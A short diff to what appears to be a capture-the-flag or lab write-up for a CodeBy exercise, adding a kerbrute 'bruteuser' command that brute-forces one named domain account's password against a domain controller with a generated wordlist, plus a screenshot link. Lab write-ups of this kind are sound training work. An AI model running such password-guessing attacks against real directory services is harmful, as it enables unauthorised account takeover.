@@ -25,3 +25,7 @@ sudo ls -la /mnt/it_stuff/Scripts
 
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/c648b73b-a853-4d2b-959c-5e1d21192ea7)
 
+```
+./kerbrute_linux_amd64 bruteuser -d codeby.cdb --dc 192.168.2.9 generated_passwords.txt valentin.badanov
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/11faab34-a8b6-4690-8585-4c3b01ac054f)
